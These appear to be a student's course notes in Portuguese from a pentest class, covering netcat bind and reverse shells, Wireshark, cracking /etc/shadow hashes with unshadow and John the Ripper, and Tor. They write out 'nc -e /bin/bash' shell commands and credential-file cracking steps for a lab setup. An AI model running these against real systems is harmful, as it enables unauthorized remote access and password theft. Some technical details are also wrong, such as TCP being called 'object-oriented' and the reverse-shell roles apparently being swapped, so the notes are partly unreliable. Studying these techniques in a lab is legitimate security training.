# Minhas anotações sobre o Curso de Pentest Womcy

## 09/08 - Resumo

### TCP/IP - conceitos básicos
O TCP é um protocolo orientado a objeto - confiável

Funciona enviando 3 pacotes para abrir a comunicação o three way handshake e para finalizar a comunicação envia 4 pacotes
(detalhar cada pacote)

Ele prioriza a não perder pacotes

UDP - considerado como não confiável
Utilizado em situações que a velocidade é importante mas a perca de pacote não
Ex.: Serviços de voz, streaming, video conferência, serviços de resolução de nomes(DNS)

Algumas vezes ambos podem ser combinados exemplo chat e video em uma chamada do Microsoft Teams

Segue um exemplo de portas sobre cada um dos protocolos:https://pt.wikipedia.org/wiki/Lista_de_portas_dos_protocolos_TCP_e_UDP

### Conexão via bind shell e reverse shell - NetCat
Pré-requisitos: Comandos básicos do linux

Ajuda do netcat:
```
nc -h
```

Na aula de hoje comentamos o arquivo de interfaces /etc/network/interfaces
Estando da seguinte maneira
```
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
auto eth1
iface eth1 inet static
        address 192.168.11.110
#       gateway 192.168.11.1
        netmask 255.255.255.0
```

Assim conseguiremos a comunicação da rede externa em nossa placa NAT (eth0) e na rede interna inet (eth1)

Reiniciando o serviço de rede da máquina ou a própria máquina

Na máquina do metaspolitable executamos(vítima)
nc -nvlp 1000

Para abrir a comunicação e ficar "ouvindo" essa porta

o mesmo realizamos na maquina atacante kali

sudo nc <ipSemSinaisdaMaquina> 1000

Assim temos a comunicação entre máquinas
  
No entanto, temos somente essa conexão e queremos a execução de um programa remoto(bindshell)

Na máquina vítima, executamos então 
nc -nvlp 1000 -e /bin/bash

No atacante(idem anterior):
  sudo nc 192.168.10.130 1000
  
  
Reverse shell - Posso fazer a minha vítima se conectar em mim e termos um acesso 
Na máquina atacante:
  nc <ipvitima> 1000 -e /bin/bash

  Na máquina vítima:
nc -nlp 100 -v
  
Sendo assim bem díficil de ser detectado tal

Mais informações em: https://github.com/dantesilva/curso-tecnicas-pentest/blob/main/Bind-and-reverse-shell.md do mestre @dantesilva
  
Em suma uma ferramenta do tipo canivete suíço, seja após um acesso na vítima realizado com sucesso ou como uma ferramenta no dia a dia, diante uma impossibilidade de acesso

## 11/08 - Resumo

### Wireshark
Se trata de um analisador de protocolos, capturando na rede as informações trafegadas, uma espécie de Sniffer(como um cão farejador), estando entre as 5 melhores juntamente com o TCPDump e outras

Ele pode ser executado tanto via terminal como no servidor gráfico. Um dos seus cores é a libpcap, tendo assim compatibilidades com demais ferramentas
        
Iniciamos abrindo o Wireshark e selecionando a placa de rede de onde queremos capturar pacotes
![image](https://user-images.githubusercontent.com/25257860/129117367-b89097a4-69be-4f37-bb59-06b5f5df1582.png)
        
Selecionamos assim a eth0 que é nossa placa configurada em uma rede NAT do virtualbox e tem acesso a internet
        
Para gerar tráfego de rede acessamos o Firefox e alguns sites, podendo assim observar as conexões do three way handshake
![image](https://user-images.githubusercontent.com/25257860/129118655-8b6a70eb-64bc-45d4-a431-bfea271938c4.png)
        
![image](https://user-images.githubusercontent.com/25257860/129119034-840d05be-b9a7-453e-9a81-2523e5ccf75e.png)

Com o botão direito em uma das conexões, podemos clicar em follow e ver os detalhes
![image](https://user-images.githubusercontent.com/25257860/129121930-ada531f8-af2e-4ba9-a9b7-0db8832577df.png)

Exemplo de uma conexão ssh filtrando pela porta
![image](https://user-images.githubusercontent.com/25257860/129122170-653846ae-7198-46f8-836b-d2575a59ce39.png) 
        
encontrando assim uma vulnerabilidade expondo a versão do ssh
![image](https://user-images.githubusercontent.com/25257860/129122206-27327636-fd91-4cc4-a6ca-b2abaee3dff9.png)

##16/08 e 18/08 - Licença médica
        
##23/08 - alterada para 24/08 - não pude comparecer
hash , criar , comparar, e sites que descriptografa os hash com listas pre salvas em banco de dados

##25/08 - hashs e John the reaper, unshadow e hash identifier, tor
       
No arquivo /etc/passwd conseguimos ver todos os usuários cadastrados no linux
![image](https://user-images.githubusercontent.com/25257860/130874145-ed8a438c-3443-49b2-b5e5-683c4c7daa3a.png)

No arquivo /etc/shadow
![image](https://user-images.githubusercontent.com/25257860/130874066-1569d304-6177-4316-9df7-a004113269a2.png)
        
Por mais que tenhamos duas senhas iguals em usuários diferentes o linux não gerará o mesmo hash devido ao componente de segurança cript por meio do uso do salt https://man7.org/linux/man-pages/man3/crypt.3.html

Um algoritmo dentro do salt traz dois caracteres aleatórios e por meio desses é gerado o hash diferente dos demais
![image](https://user-images.githubusercontent.com/25257860/130875174-a6a6122e-c4f0-4493-8771-ee7d4b68eeab.png)

assim copiamos os arquivos citados, usando o unshadown e atraves do Jonh the reaper usando os arquivos foi possível encontrar as senhas mais faceis, pois o unshadow muda para a forma antiga que o linux gerava os hashs e assim trabalha em cima desses
O unshadown junta os dois arquivos
     
unshadow passwd1 shadow1 > vitima
        
![image](https://user-images.githubusercontent.com/25257860/130878477-3ddc1406-73ad-4313-a538-d23b9c6b8652.png)

  

se vc quiser editar a lista padrão do John -> /usr/share/john/password.lst

se quiser testar uma lista que vc criou -> --wordlist[=arquivoquevccriou]

Conseguimos também descobrir o possível hash, no exemplo abaixo geramos com md5 e o hash identifier descobriu tal
![image](https://user-images.githubusercontent.com/25257860/130878038-36c49f7e-bd63-4173-aebd-966936adafad.png)

        
Conceitos:
surface web - aberta para todos entrar, sites normais
        
deep web - sites ou acessos a serviços não abertos a todos. Seu email, wpp, telegram, contas pessoais não abertas para a internet. Exemplo suas conversas não estão abertas a todos

dark web - contem uma conexão com alto nível de criptografia. Acessível através do tor. Além de passar por diversos servidores em rotas diferentes, sendo praticamente impossível a rastreabilidade
        
temos o protocolo tor e o navegador tor.

É recomendável sempre utilizar uma máquina virtual
        
fizemos a instalação do tor atraves de apt-get install tor torbrowser-launcher
outra forma seria seguindo esse tutorial: https://techstart.xyz/linux/como-instalar-o-tor-no-kali-linux-apt/

Se apresentar essa tela ao abrir e clicar em conect você já está navegando na darkweb
![image](https://user-images.githubusercontent.com/25257860/130879753-cbb844df-ad4e-46dc-831c-08e61ac1b731.png)

Os endereços são diferentes na darkweb, são maiores que os normais e não tem wwww, você poderá pesquisar sites da darkweb para localizar esses

ex.:
    https://darkweburls.com/#:~:text=People%20often%20refer%20to%20dark%20web%20urls%20as,that%20have%20their%20IP%20addresses%20hidden%20or%20masked

## 31/08 - 

Há a diferença entre um trabalho de pentest e redteam. Ambos são executados com conhecimento da empresa, porém o red team ele é mais silencioso, ou seja, tentando executar ataques evitando ser detectado, com isso geralmente 
Já no pentest, esse causa um maior ruído na rede sendo facilmente detectado.

Realizamos o download e instalação do windows 10 pro, para que utiliza windows foi necessário realizar o download da ferramenta de downlod de mídia da microsoft em:
https://www.microsoft.com/en-us/software-download/windows10ISO

![image](https://user-images.githubusercontent.com/25257860/131585896-473944e1-c5d9-4695-bfcb-1bc14b217ef4.png)

![image](https://user-images.githubusercontent.com/25257860/131585920-85714684-973c-4f6b-87e2-350acbd02faa.png)

![image](https://user-images.githubusercontent.com/25257860/131585935-cdee1966-8408-48c5-800e-b247848dcc86.png)

![image](https://user-images.githubusercontent.com/25257860/131585948-b556be6b-2d28-4fa7-968b-d9659ffac2db.png)

![image](https://user-images.githubusercontent.com/25257860/131586017-b9d963d4-02e5-43d8-85ff-975af2026e6c.png)

![image](https://user-images.githubusercontent.com/25257860/131586028-79192fe2-2b85-460e-a5d8-09fc2766ccc7.png)

Assim logo após o download e verificação da máquina virtual, basta inserir essa no virtualbox e instalar
        Recomendações: Tamanho do disco como 30gb dinamicamente alocado

Configuramos assim após a instalação do windows a rede
![image](https://user-images.githubusercontent.com/25257860/131590447-f1d9fc7d-0aaa-496e-a782-c6f73111d747.png)

![image](https://user-images.githubusercontent.com/25257860/131590479-c47799d6-93d3-4d28-a7dd-1b56116d1590.png)

![image](https://user-images.githubusercontent.com/25257860/131590890-fd812335-9ece-4492-ae97-6018d7716296.png)

![image](https://user-images.githubusercontent.com/25257860/131592231-328ecd75-b4b6-4de9-bc86-94f3d2c43ac2.png)
